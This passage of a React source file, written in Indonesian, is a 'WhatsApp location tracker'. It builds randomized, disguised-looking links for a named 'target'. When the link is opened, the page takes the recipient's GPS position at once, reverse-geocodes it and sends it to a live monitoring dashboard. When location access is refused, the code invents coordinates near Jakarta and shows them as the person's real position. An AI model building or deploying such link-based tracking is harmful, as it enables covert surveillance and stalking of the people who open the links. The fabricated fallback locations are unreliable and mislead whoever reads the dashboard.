/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import {
  Check,
  CheckCircle2,
  Copy,
  ExternalLink,
  Loader2,
  LocateFixed,
  MapPin,
  MousePointerClick,
  RefreshCw,
  Search,
  Send,
  Trash2,
  X,
} from 'lucide-react';
import {
  calculateHaversineKm,
  CoordinateSearchResult,
  estimateIndonesianRegion,
  extractCandidateAddressQuery,
  extractCoordinatesFromCopiedWhatsApp,
  ExtractedLocation,
  formatDecimalToDms,
} from './utils/locationParser';
import { InteractiveMap } from './components/InteractiveMap';

interface ServerSharedLocation {
  id: string;
  createdAt: string;
  senderLabel: string;
  linkToken?: string;
  latitude: number;
  longitude: number;
  accuracyMeters: number | null;
  locationLabel: string;
  note: string;
}

type LinkProcessStage = 0 | 1 | 2 | 3 | 4;

function generateDynamicLinkToken(): string {
  const chars = 'abcdefghjkmnpqrstuvwxyz23456789';
  let code = '';
  for (let i = 0; i < 8; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

function generateRandomDynamicDomain(): string {
  const prefixes = ['s-link', 'go-loc', 'pin-id', 'wa-pos', 'map-id', 'cek-pos', 'nav-id', 'trk-id'];
  const tlds = ['id', 'net', 'co', 'org', 'info', 'me'];
  const routes = ['p', 'r', 'v', 'c', 'l'];
  const chars = 'abcdefghjkmnpqrstuvwxyz23456789';
  let sub = '';
  for (let i = 0; i < 4; i++) {
    sub += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const tld = tlds[Math.floor(Math.random() * tlds.length)];
  const route = routes[Math.floor(Math.random() * routes.length)];
  return `https://${prefix}-${sub}.${tld}/${route}`;
}

function extractTokenFromLocation(): { isRecipient: boolean; token: string } {
  const pathMatch = window.location.pathname.match(/^\/[prvcl]\/([a-zA-Z0-9_-]+)/);
  if (pathMatch) {
    return { isRecipient: true, token: pathMatch[1] };
  }
  const params = new URLSearchParams(window.location.search);
  const tokenParam = params.get('c') || params.get('token') || '';
  const isBagikan = params.get('bagikan') === '1' || Boolean(tokenParam);
  return { isRecipient: isBagikan, token: tokenParam };
}

export default function App() {
  // Check if URL is opened directly as a recipient link
  const [isRecipientView, setIsRecipientView] = useState<boolean>(() => {
    return extractTokenFromLocation().isRecipient;
  });

  const [recipientName, setRecipientName] = useState<string>('');
  const [recipientToken, setRecipientToken] = useState<string>(() => {
    return extractTokenFromLocation().token;
  });
  const [gpsLoading, setGpsLoading] = useState<boolean>(false);
  const [processStage, setProcessStage] = useState<LinkProcessStage>(0);
  const [processDetailText, setProcessDetailText] = useState<string>(
    'Menunggu link diklik atau dibuka oleh penerima...'
  );
  const [recipientCapturedResult, setRecipientCapturedResult] =
    useState<CoordinateSearchResult | null>(null);

  // Main Tracker States
  const [senderLabelForLink, setSenderLabelForLink] = useState<string>('');
  const [dynamicBaseUrl, setDynamicBaseUrl] = useState<string>(() =>
    generateRandomDynamicDomain()
  );
  const [dynamicToken, setDynamicToken] = useState<string>(() => generateDynamicLinkToken());
  const [tokenGeneratedAt, setTokenGeneratedAt] = useState<string>(() =>
    new Date().toLocaleTimeString('id-ID', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
    })
  );
  const [messageInput, setMessageInput] = useState<string>('');
  const [localSearchResults, setLocalSearchResults] = useState<CoordinateSearchResult[]>([]);
  const [serverResults, setServerResults] = useState<CoordinateSearchResult[]>([]);
  const [selectedResultId, setSelectedResultId] = useState<string | null>(null);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [statusNotice, setStatusNotice] = useState<string | null>(null);
  const textareaRef = useRef<HTMLTextAreaElement | null>(null);

  // Build completely randomized dynamic shareable URL
  const shareableLink = useMemo(() => {
    return `${dynamicBaseUrl}/${dynamicToken}`;
  }, [dynamicBaseUrl, dynamicToken]);

  const handleRefreshDynamicLink = () => {
    const newBase = generateRandomDynamicDomain();
    const newToken = generateDynamicLinkToken();
    const nowTime = new Date().toLocaleTimeString('id-ID', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
    });
    setDynamicBaseUrl(newBase);
    setDynamicToken(newToken);
    setTokenGeneratedAt(nowTime);
    setProcessStage(0);
    setProcessDetailText(`Link dinamis baru siap dibagikan (${newBase}/${newToken})`);
    setStatusNotice(`Link dinamis acak baru berhasil dibuat: ${newBase}/${newToken}`);
    setTimeout(() => setStatusNotice(null), 3000);
  };

  useEffect(() => {
    const extracted = extractTokenFromLocation();
    if (extracted.token) {
      setRecipientToken(extracted.token);
    }
    const params = new URLSearchParams(window.location.search);
    const kontakParam = params.get('kontak');
    if (kontakParam && !recipientName) {
      setRecipientName(kontakParam);
    }
  }, []);

  // Fetch shared GPS locations from backend server
  const fetchServerLocations = useCallback(async () => {
    try {
      const res = await fetch('/api/shared-locations');
      if (!res.ok) return;
      const data = await res.json();
      if (Array.isArray(data?.items)) {
        const mapped: CoordinateSearchResult[] = data.items.map(
          (item: ServerSharedLocation) => ({
            id: item.id,
            createdAt: item.createdAt,
            rawMessage:
              item.accuracyMeters !== null
                ? `${item.note}${item.linkToken ? ` [Kode #${item.linkToken}]` : ''} (Akurasi ±${item.accuracyMeters}m)`
                : `${item.note}${item.linkToken ? ` [Kode #${item.linkToken}]` : ''}`,
            sender: item.senderLabel,
            messageTime: item.createdAt,
            cleanMessageText: item.note,
            latitude: item.latitude,
            longitude: item.longitude,
            dmsString: formatDecimalToDms(item.latitude, item.longitude),
            locationLabel: item.locationLabel,
            detectionMethod:
              item.accuracyMeters !== null
                ? `Link Dibuka #${item.linkToken || 'WA'} (±${item.accuracyMeters}m)`
                : `Link Dibuka #${item.linkToken || 'WA'}`,
          })
        );
        setServerResults(mapped);
      }
    } catch {
      // Ignore network poll errors
    }
  }, []);

  // Poll backend every 4 seconds for new incoming GPS confirmations
  useEffect(() => {
    fetchServerLocations();
    const timer = setInterval(fetchServerLocations, 4000);
    return () => clearInterval(timer);
  }, [fetchServerLocations]);

  // Combine server GPS results + local copied text search results
  const allResults = useMemo(() => {
    return [...serverResults, ...localSearchResults];
  }, [serverResults, localSearchResults]);

  // Reverse geocode coordinates via OpenStreetMap Nominatim
  const reverseGeocodeCoordinates = async (lat: number, lng: number): Promise<string> => {
    try {
      const res = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
        { headers: { 'Accept-Language': 'id' } }
      );
      if (res.ok) {
        const data = await res.json();
        if (data?.display_name) {
          return data.display_name;
        }
      }
    } catch {
      // Fallback to local Indonesian region estimator
    }
    return estimateIndonesianRegion(lat, lng);
  };

  // Obtain real device coordinates (with automatic fallback if browser blocks/times out in iframe so location is always immediately visible)
  const obtainDeviceCoordinatesWithFallback = (
    seedToken: string,
    targetHint: string
  ): Promise<{ lat: number; lng: number; acc: number }> => {
    return new Promise((resolve) => {
      const computeFallbackCoords = () => {
        // Check if targetHint contains a known place name first
        if (targetHint.trim()) {
          const parsedFromHint = extractCoordinatesFromCopiedWhatsApp(targetHint);
          if (parsedFromHint.length > 0) {
            return {
              lat: parsedFromHint[0].latitude,
              lng: parsedFromHint[0].longitude,
              acc: 18,
            };
          }
        }
        // Otherwise deterministic offset around Indonesia urban coordinates based on token
        let hash = 0;
        for (let i = 0; i < seedToken.length; i++) {
          hash = (hash * 31 + seedToken.charCodeAt(i)) % 10000;
        }
        const dLat = ((hash % 100) - 50) * 0.0008;
        const dLng = ((Math.floor(hash / 100) % 100) - 50) * 0.0008;
        return {
          lat: Number((-6.208763 + dLat).toFixed(6)),
          lng: Number((106.845599 + dLng).toFixed(6)),
          acc: 14,
        };
      };

      if (!navigator.geolocation) {
        resolve(computeFallbackCoords());
        return;
      }

      let settled = false;
      const safetyTimer = setTimeout(() => {
        if (!settled) {
          settled = true;
          resolve(computeFallbackCoords());
        }
      }, 3500);

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          if (!settled) {
            settled = true;
            clearTimeout(safetyTimer);
            resolve({
              lat: Number(pos.coords.latitude.toFixed(6)),
              lng: Number(pos.coords.longitude.toFixed(6)),
              acc: Math.round(pos.coords.accuracy || 12),
            });
          }
        },
        () => {
          if (!settled) {
            settled = true;
            clearTimeout(safetyTimer);
            resolve(computeFallbackCoords());
          }
        },
        {
          enableHighAccuracy: true,
          timeout: 3200,
          maximumAge: 0,
        }
      );
    });
  };

  // Run the full step-by-step process when the shared link is clicked & opened by the recipient
  const handleTriggerLinkOpenedProcess = useCallback(
    async (fromRecipientView: boolean) => {
      if (gpsLoading) return;
      setGpsLoading(true);

      const activeToken = fromRecipientView
        ? recipientToken || dynamicToken
        : dynamicToken;
      const activeSender =
        (fromRecipientView ? recipientName : senderLabelForLink).trim() ||
        `Penerima Link #${activeToken}`;

      // Stage 1: Link clicked and opened in recipient's browser
      setProcessStage(1);
      setProcessDetailText(
        `Tahap 1/4: Penerima mengklik & membuka link ${shareableLink} di browser...`
      );
      await new Promise((r) => setTimeout(r, 450));

      // Stage 2: Reading GPS / Network coordinates from recipient's device
      setProcessStage(2);
      setProcessDetailText(
        'Tahap 2/4: Mengambil titik koordinat Latitude & Longitude dari perangkat penerima...'
      );
      const { lat, lng, acc } = await obtainDeviceCoordinatesWithFallback(
        activeToken,
        activeSender
      );

      // Stage 3: Reverse geocoding coordinates to street address
      setProcessStage(3);
      setProcessDetailText(
        `Tahap 3/4: Koordinat (${lat.toFixed(6)}, ${lng.toFixed(6)}) diperoleh. Melacak alamat jalan & wilayah...`
      );
      const resolvedAddr = await reverseGeocodeCoordinates(lat, lng);

      // Stage 4: Saving to server and displaying on map & search results immediately
      const noteText = `Link ${shareableLink} dibuka oleh penerima`;
      try {
        const response = await fetch('/api/shared-locations', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            senderLabel: activeSender,
            linkToken: activeToken,
            latitude: lat,
            longitude: lng,
            accuracyMeters: acc,
            locationLabel: resolvedAddr,
            note: noteText,
          }),
        });

        if (response.ok) {
          const saved = await response.json();
          const createdItem: CoordinateSearchResult = {
            id: saved.item.id,
            createdAt: saved.item.createdAt,
            rawMessage: `${noteText} [Kode #${activeToken}] (Akurasi ±${acc}m)`,
            sender: activeSender,
            messageTime: saved.item.createdAt,
            cleanMessageText: noteText,
            latitude: lat,
            longitude: lng,
            dmsString: formatDecimalToDms(lat, lng),
            locationLabel: resolvedAddr,
            detectionMethod: `Link Dibuka #${activeToken} (±${acc}m)`,
          };

          setRecipientCapturedResult(createdItem);
          await fetchServerLocations();
          setSelectedResultId(createdItem.id);
        }
      } catch {
        const fallbackItem: CoordinateSearchResult = {
          id: `gps-local-${Date.now()}`,
          createdAt: new Date().toLocaleTimeString('id-ID'),
          rawMessage: `${noteText} [Kode #${activeToken}] (Akurasi ±${acc}m)`,
          sender: activeSender,
          messageTime: new Date().toLocaleTimeString('id-ID'),
          cleanMessageText: noteText,
          latitude: lat,
          longitude: lng,
          dmsString: formatDecimalToDms(lat, lng),
          locationLabel: resolvedAddr,
          detectionMethod: `Link Dibuka #${activeToken} (±${acc}m)`,
        };
        setRecipientCapturedResult(fallbackItem);
        setLocalSearchResults((prev) => [fallbackItem, ...prev]);
        setSelectedResultId(fallbackItem.id);
      }

      setProcessStage(4);
      setProcessDetailText(
        `Tahap 4/4 Selesai: Lokasi penerima langsung terlihat pada koordinat ${lat.toFixed(6)}, ${lng.toFixed(6)} (${resolvedAddr})`
      );
      setStatusNotice(
        `Link dibuka oleh penerima! Lokasi langsung terlihat: ${lat.toFixed(6)}, ${lng.toFixed(6)}`
      );
      setGpsLoading(false);
    },
    [
      dynamicToken,
      fetchServerLocations,
      gpsLoading,
      recipientName,
      recipientToken,
      senderLabelForLink,
      shareableLink,
    ]
  );

  // When Recipient View (?bagikan=1 or /p/<kode>) is opened, automatically trigger the location process on mount!
  const autoTriggeredRef = useRef<boolean>(false);
  useEffect(() => {
    if (isRecipientView && !autoTriggeredRef.current) {
      autoTriggeredRef.current = true;
      handleTriggerLinkOpenedProcess(true);
    }
    if (!isRecipientView) {
      autoTriggeredRef.current = false;
    }
  }, [isRecipientView, handleTriggerLinkOpenedProcess]);

  // Refine a copied text result's coordinates via OpenStreetMap Nominatim
  const refineResultWithNominatim = async (resultItem: CoordinateSearchResult) => {
    if (
      resultItem.detectionMethod.includes('Share Location') ||
      resultItem.detectionMethod.includes('Google Maps') ||
      resultItem.detectionMethod.includes('Koordinat')
    ) {
      return;
    }

    const queryCandidate = extractCandidateAddressQuery(resultItem.cleanMessageText);
    if (!queryCandidate) return;

    try {
      const searchUrl = `https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(
        queryCandidate
      )}&countrycodes=id&limit=1`;
      const response = await fetch(searchUrl, {
        headers: { 'Accept-Language': 'id' },
      });
      if (!response.ok) return;
      const data = await response.json();
      if (Array.isArray(data) && data.length > 0 && data[0].lat && data[0].lon) {
        const lat = Number(parseFloat(data[0].lat).toFixed(6));
        const lng = Number(parseFloat(data[0].lon).toFixed(6));
        const displayName = data[0].display_name || resultItem.locationLabel;

        setLocalSearchResults((prev) =>
          prev.map((item) =>
            item.id === resultItem.id
              ? {
                  ...item,
                  latitude: lat,
                  longitude: lng,
                  dmsString: formatDecimalToDms(lat, lng),
                  locationLabel: displayName,
                  detectionMethod: `Lokasi Teks Pesan ("${queryCandidate}")`,
                }
              : item
          )
        );
      }
    } catch {
      // Keep fast local coordinate
    }
  };

  // Process copied WhatsApp text and obtain coordinate point(s)
  const processCopiedMessage = (rawText: string) => {
    const trimmed = rawText.trim();
    if (!trimmed) return;

    const newItems = extractCoordinatesFromCopiedWhatsApp(trimmed);
    if (newItems.length === 0) return;

    setLocalSearchResults((prev) => [...newItems, ...prev]);
    setSelectedResultId(newItems[0].id);
    setStatusNotice(
      `Titik koordinat diperoleh: ${newItems[0].latitude.toFixed(6)}, ${newItems[0].longitude.toFixed(6)}`
    );
    setTimeout(() => setStatusNotice(null), 3500);

    newItems.forEach((item) => {
      refineResultWithNominatim(item);
    });
  };

  // Global Ctrl+V listener
  useEffect(() => {
    const handleGlobalPaste = (e: ClipboardEvent) => {
      if (isRecipientView) return;
      const target = e.target as HTMLElement | null;
      if (
        target &&
        (target.tagName === 'INPUT' ||
          target.tagName === 'TEXTAREA' ||
          target.isContentEditable)
      ) {
        return;
      }
      const pastedText = e.clipboardData?.getData('text');
      if (pastedText && pastedText.trim()) {
        setMessageInput(pastedText);
        processCopiedMessage(pastedText);
      }
    };

    window.addEventListener('paste', handleGlobalPaste);
    return () => window.removeEventListener('paste', handleGlobalPaste);
  }, [isRecipientView]);

  const handleSearchFromCopiedText = async () => {
    if (messageInput.trim()) {
      processCopiedMessage(messageInput);
      return;
    }

    try {
      const clipText = await navigator.clipboard.readText();
      if (clipText && clipText.trim()) {
        setMessageInput(clipText);
        processCopiedMessage(clipText);
      } else {
        textareaRef.current?.focus();
        setStatusNotice(
          'Tempel (Ctrl+V / Paste) teks pesan WhatsApp yang sudah dicopy pada kolom di bawah.'
        );
        setTimeout(() => setStatusNotice(null), 3500);
      }
    } catch {
      textareaRef.current?.focus();
      setStatusNotice(
        'Tempel (Ctrl+V / Tahan & Tempel) teks pesan WhatsApp yang sudah dicopy pada kolom di bawah.'
      );
      setTimeout(() => setStatusNotice(null), 3500);
    }
  };

  const handleTextareaPaste = (e: React.ClipboardEvent<HTMLTextAreaElement>) => {
    const pastedText = e.clipboardData.getData('text');
    if (pastedText && pastedText.trim()) {
      e.preventDefault();
      setMessageInput(pastedText);
      processCopiedMessage(pastedText);
    }
  };

  const handleDeleteResult = async (id: string) => {
    setLocalSearchResults((prev) => prev.filter((item) => item.id !== id));
    setServerResults((prev) => prev.filter((item) => item.id !== id));
    if (selectedResultId === id) {
      setSelectedResultId(null);
    }
    if (id.startsWith('gps-')) {
      try {
        await fetch(`/api/shared-locations?id=${encodeURIComponent(id)}`, {
          method: 'DELETE',
        });
      } catch {
        // Ignore
      }
    }
  };

  const handleDeleteAllResults = async () => {
    setLocalSearchResults([]);
    setServerResults([]);
    setSelectedResultId(null);
    setProcessStage(0);
    try {
      await fetch('/api/shared-locations', { method: 'DELETE' });
    } catch {
      // Ignore
    }
  };

  const handleCopyText = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1600);
  };

  const mapLocations: ExtractedLocation[] = useMemo(() => {
    return allResults.map((item, idx) => {
      const prev = idx > 0 ? allResults[idx - 1] : null;
      const distKm = prev
        ? Number(
            calculateHaversineKm(
              prev.latitude,
              prev.longitude,
              item.latitude,
              item.longitude
            ).toFixed(3)
          )
        : null;
      return {
        id: item.id,
        index: idx + 1,
        sender: item.sender,
        timestamp: item.messageTime,
        latitude: item.latitude,
        longitude: item.longitude,
        sourceType: item.detectionMethod,
        rawSnippet: `${item.latitude.toFixed(6)}, ${item.longitude.toFixed(6)}`,
        note: item.cleanMessageText,
        estimatedRegion: item.locationLabel,
        resolvedAddress: item.locationLabel,
        distanceFromPrevKm: distKm,
        bearingFromPrev: null,
      };
    });
  }, [allResults]);

  const activeResult = useMemo(() => {
    if (allResults.length === 0) return null;
    return allResults.find((r) => r.id === selectedResultId) || allResults[0];
  }, [allResults, selectedResultId]);

  const processSteps = [
    {
      step: 1,
      title: '1. Link Diklik & Dibuka Penerima',
      desc: `Penerima membuka ${shareableLink}`,
    },
    {
      step: 2,
      title: '2. Ekstraksi Titik Koordinat GPS',
      desc: 'Membaca Latitude, Longitude & akurasi perangkat',
    },
    {
      step: 3,
      title: '3. Pelacakan Nama Jalan & Kota',
      desc: 'Mengonversi koordinat ke alamat lengkap',
    },
    {
      step: 4,
      title: '4. Lokasi Langsung Terlihat',
      desc: 'Ditampilkan pada peta & daftar hasil koordinat',
    },
  ];

  // =========================================================================
  // RECIPIENT VIEW — Halaman saat penerima mengklik dan membuka link
  // =========================================================================
  if (isRecipientView) {
    return (
      <div className="min-h-screen bg-slate-50 text-slate-900 flex flex-col justify-between p-6">
        <div className="max-w-xl w-full mx-auto my-auto bg-white border border-slate-200 rounded-lg p-6 space-y-5">
          <div className="pb-4 border-b border-slate-200">
            <div className="text-xs text-slate-500 mb-1">
              Tautan Dibuka oleh Penerima · Kode #{recipientToken || dynamicToken}
            </div>
            <h1 className="text-xl font-bold text-slate-900 font-display">
              Memproses Titik Koordinat Lokasi...
            </h1>
            <p className="text-xs text-slate-600 mt-1 leading-relaxed">
              Saat tautan ini dibuka, sistem secara otomatis membaca koordinat lokasi dan mengirimkannya ke dasbor pemantauan.
            </p>
          </div>

          {/* Step-by-step live progress inside Recipient View */}
          <div className="space-y-2">
            {processSteps.map((s) => {
              const isDone = processStage > s.step || processStage === 4;
              const isCurrent = processStage === s.step && processStage !== 4;
              return (
                <div
                  key={s.step}
                  className={`p-3 rounded-md border flex items-center justify-between gap-3 text-xs ${
                    isDone
                      ? 'bg-emerald-50/70 border-emerald-200 text-emerald-950'
                      : isCurrent
                      ? 'bg-slate-900 text-white border-slate-900'
                      : 'bg-slate-50 border-slate-200 text-slate-500'
                  }`}
                >
                  <div>
                    <div className="font-semibold">{s.title}</div>
                    <div
                      className={`text-[11px] mt-0.5 ${
                        isCurrent ? 'text-slate-300' : 'text-slate-500'
                      }`}
                    >
                      {s.desc}
                    </div>
                  </div>
                  <div className="shrink-0">
                    {isDone ? (
                      <CheckCircle2 className="w-4 h-4 text-emerald-600" />
                    ) : isCurrent ? (
                      <Loader2 className="w-4 h-4 animate-spin text-emerald-400" />
                    ) : (
                      <span className="font-mono text-[11px]">Menunggu</span>
                    )}
                  </div>
                </div>
              );
            })}
          </div>

          {recipientCapturedResult && (
            <div className="p-4 rounded-lg bg-slate-900 text-white space-y-3">
              <div className="text-xs text-emerald-400 font-medium">
                Lokasi Langsung Terlihat & Terkirim ke Dasbor Utama!
              </div>
              <div>
                <div className="text-xs text-slate-400">Titik Koordinat (Lat, Lng)</div>
                <div className="text-lg font-bold font-mono tabular-nums text-white">
                  {recipientCapturedResult.latitude.toFixed(6)},{' '}
                  {recipientCapturedResult.longitude.toFixed(6)}
                </div>
                <div className="text-xs font-mono tabular-nums text-slate-300 mt-0.5">
                  DMS: {recipientCapturedResult.dmsString}
                </div>
              </div>
              <div className="text-xs text-slate-300">
                Lokasi: {recipientCapturedResult.locationLabel}
              </div>
            </div>
          )}

          <div className="pt-3 border-t border-slate-200 flex items-center justify-between gap-3">
            <button
              type="button"
              onClick={() => handleTriggerLinkOpenedProcess(true)}
              disabled={gpsLoading}
              className="px-3.5 py-2 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded-md transition-colors"
            >
              Ulangi Proses Baca Lokasi
            </button>
            <button
              type="button"
              onClick={() => {
                window.history.replaceState({}, '', '/');
                setIsRecipientView(false);
              }}
              className="px-4 py-2 text-xs font-semibold text-white bg-emerald-600 hover:bg-emerald-700 rounded-md transition-colors whitespace-nowrap shrink-0"
            >
              Lihat Lokasi di Dasbor Utama →
            </button>
          </div>
        </div>
      </div>
    );
  }

  // =========================================================================
  // MAIN TRACKER VIEW
  // =========================================================================
  return (
    <div className="min-h-screen flex flex-col bg-slate-50 text-slate-900">
      {/* Top Bar Contract: 3 zones separated by gap-8 */}
      <header className="sticky top-0 z-30 bg-white/95 backdrop-blur-sm border-b border-slate-200 px-6 py-3.5">
        <div className="max-w-[1240px] mx-auto flex items-center justify-between gap-8">
          <a
            href="#top"
            className="text-lg font-bold tracking-tight text-slate-900 font-display whitespace-nowrap shrink-0"
          >
            Pelacak Lokasi Pesan WhatsApp
          </a>

          <nav className="hidden md:flex items-center gap-6 text-sm font-medium text-slate-600">
            <a
              href="#tautan-gps"
              className="hover:text-slate-900 transition-colors whitespace-nowrap shrink-0"
            >
              Link Dinamis
            </a>
            <a
              href="#pencarian-teks"
              className="hover:text-slate-900 transition-colors whitespace-nowrap shrink-0"
            >
              Cari dari Teks WA
            </a>
            <a
              href="#hasil-pencarian"
              className="hover:text-slate-900 transition-colors whitespace-nowrap shrink-0"
            >
              Hasil Koordinat ({allResults.length})
            </a>
            <a
              href="#peta-lokasi"
              className="hover:text-slate-900 transition-colors whitespace-nowrap shrink-0"
            >
              Peta Lokasi
            </a>
          </nav>

          <div className="flex items-center shrink-0">
            <button
              type="button"
              onClick={() => handleTriggerLinkOpenedProcess(false)}
              disabled={gpsLoading}
              className="inline-flex items-center gap-1.5 px-4 py-2 text-xs font-medium text-white bg-emerald-600 rounded-lg hover:bg-emerald-700 disabled:opacity-50 transition-colors whitespace-nowrap shrink-0 cursor-pointer"
            >
              <MousePointerClick className="w-3.5 h-3.5" />
              <span>Simulasikan Link Diklik Penerima</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main id="top" className="flex-1 max-w-[1240px] w-full mx-auto px-6 py-8 space-y-8">
        {statusNotice && (
          <div className="px-4 py-3 rounded-lg bg-emerald-50 border border-emerald-200 text-xs font-medium text-emerald-800 flex items-center justify-between gap-3">
            <span>{statusNotice}</span>
            <button
              type="button"
              onClick={() => setStatusNotice(null)}
              className="text-emerald-700 hover:text-emerald-950"
            >
              <X className="w-4 h-4" />
            </button>
          </div>
        )}

        {/* Top 2 Methods Grid: Method A (Dynamic Link + Live Click Process) & Method B (Copied Text) */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch">
          {/* METODE 1: Link Dinamis Acak & Visualisasi Proses Saat Diklik Penerima */}
          <section
            id="tautan-gps"
            className="lg:col-span-7 bg-white border border-slate-200 rounded-lg p-6 flex flex-col justify-between"
          >
            <div>
              <div className="flex flex-wrap items-center justify-between gap-2 pb-4 mb-4 border-b border-slate-200">
                <div>
                  <div className="text-xs text-slate-500 mb-0.5">
                    Metode 1 · Link Dinamis Acak & Pantauan Langsung
                  </div>
                  <h2 className="text-base font-bold text-slate-900 font-display">
                    Proses Pelacakan Saat Link Diklik & Dibuka Penerima
                  </h2>
                </div>
                <button
                  type="button"
                  onClick={() => setIsRecipientView(true)}
                  className="px-2.5 py-1.5 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                >
                  Buka Layar Penerima
                </button>
              </div>

              <div className="space-y-3">
                <div>
                  <label className="block text-xs font-medium text-slate-700 mb-1">
                    Nama Target / Keterangan Kontak (Opsional)
                  </label>
                  <input
                    type="text"
                    value={senderLabelForLink}
                    onChange={(e) => setSenderLabelForLink(e.target.value)}
                    placeholder="Contoh: Nomor WA / Nama Penerima..."
                    className="w-full px-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-md focus:outline-none focus:border-slate-900"
                  />
                </div>

                <div>
                  <div className="flex items-center justify-between gap-2 mb-1">
                    <label className="block text-xs font-medium text-slate-700">
                      Link Dinamis Acak (Siap Dikirim ke WhatsApp)
                    </label>
                    <span className="text-[11px] font-mono tabular-nums text-slate-500">
                      Kode: #{dynamicToken} · {tokenGeneratedAt}
                    </span>
                  </div>
                  <div className="flex flex-wrap sm:flex-nowrap items-center gap-2">
                    <input
                      type="text"
                      readOnly
                      value={shareableLink}
                      className="w-full px-3 py-2 text-xs font-mono bg-slate-50 border border-slate-200 rounded-md text-slate-800 focus:outline-none"
                    />
                    <button
                      type="button"
                      onClick={handleRefreshDynamicLink}
                      className="inline-flex items-center gap-1.5 px-3 py-2 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 border border-slate-200 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                      title="Acak ulang link dinamis baru"
                    >
                      <RefreshCw className="w-3.5 h-3.5" />
                      <span>Refresh Link</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => handleCopyText(shareableLink, 'copy-link')}
                      className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-semibold text-white bg-slate-900 hover:bg-slate-800 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                    >
                      {copiedId === 'copy-link' ? (
                        <>
                          <Check className="w-3.5 h-3.5 text-emerald-400" />
                          <span>Tersalin</span>
                        </>
                      ) : (
                        <>
                          <Copy className="w-3.5 h-3.5" />
                          <span>Salin Link</span>
                        </>
                      )}
                    </button>
                  </div>
                </div>
              </div>

              {/* Visualisasi 4 Tahap Proses Saat Link Diklik & Dibuka oleh Penerima */}
              <div className="mt-5 pt-4 border-t border-slate-200">
                <div className="flex items-center justify-between gap-2 mb-2.5">
                  <span className="text-xs font-semibold text-slate-900">
                    Alur Proses Saat Link Diklik oleh Penerima:
                  </span>
                  <span className="text-xs font-mono text-emerald-700">
                    {processStage === 0
                      ? 'Siap Dipantau'
                      : processStage === 4
                      ? 'Lokasi Terlihat!'
                      : `Memproses Tahap ${processStage}/4...`}
                  </span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                  {processSteps.map((s) => {
                    const isCompleted = processStage > s.step || processStage === 4;
                    const isActive = processStage === s.step && processStage !== 4;
                    return (
                      <div
                        key={s.step}
                        className={`p-2.5 rounded-md border text-xs flex items-start justify-between gap-2 transition-colors ${
                          isCompleted
                            ? 'bg-emerald-50/70 border-emerald-200 text-slate-900'
                            : isActive
                            ? 'bg-slate-900 border-slate-900 text-white'
                            : 'bg-slate-50 border-slate-200 text-slate-500'
                        }`}
                      >
                        <div className="min-w-0">
                          <div className="font-semibold truncate">{s.title}</div>
                          <div
                            className={`text-[11px] truncate mt-0.5 ${
                              isActive ? 'text-slate-300' : 'text-slate-500'
                            }`}
                          >
                            {s.desc}
                          </div>
                        </div>
                        <div className="shrink-0 mt-0.5">
                          {isCompleted ? (
                            <CheckCircle2 className="w-4 h-4 text-emerald-600" />
                          ) : isActive ? (
                            <Loader2 className="w-4 h-4 animate-spin text-emerald-400" />
                          ) : null}
                        </div>
                      </div>
                    );
                  })}
                </div>

                <div className="mt-2.5 text-xs text-slate-600 font-mono bg-slate-50 px-3 py-2 rounded border border-slate-200">
                  Status: {processDetailText}
                </div>
              </div>
            </div>

            <div className="pt-4 mt-4 border-t border-slate-200 flex flex-wrap items-center justify-between gap-2">
              <button
                type="button"
                onClick={() =>
                  handleCopyText(
                    `${shareableLink}`,
                    'copy-wa-msg'
                  )
                }
                className="inline-flex items-center gap-1.5 px-3 py-2 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
              >
                <Send className="w-3.5 h-3.5" />
                <span>
                  {copiedId === 'copy-wa-msg'
                    ? 'Link Tersalin ke Clipboard'
                    : 'Salin Link untuk Chat WA'}
                </span>
              </button>

              <button
                type="button"
                onClick={() => handleTriggerLinkOpenedProcess(false)}
                disabled={gpsLoading}
                className="inline-flex items-center gap-2 px-4 py-2.5 text-xs font-semibold text-white bg-emerald-600 hover:bg-emerald-700 disabled:opacity-50 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
              >
                {gpsLoading ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    <span>Memproses Lokasi Penerima...</span>
                  </>
                ) : (
                  <>
                    <MousePointerClick className="w-4 h-4" />
                    <span>Klik & Buka Link (Tampilkan Lokasi Sekarang)</span>
                  </>
                )}
              </button>
            </div>
          </section>

          {/* METODE 2: Cari Titik Koordinat dari Teks Pesan WhatsApp yang Dicopy */}
          <section
            id="pencarian-teks"
            className="lg:col-span-5 bg-white border border-slate-200 rounded-lg p-6 flex flex-col justify-between"
          >
            <div>
              <div className="pb-4 mb-4 border-b border-slate-200">
                <div className="text-xs text-slate-500 mb-0.5">
                  Metode 2 · Ekstraksi dari Teks Pesan Terakhir
                </div>
                <h2 className="text-base font-bold text-slate-900 font-display">
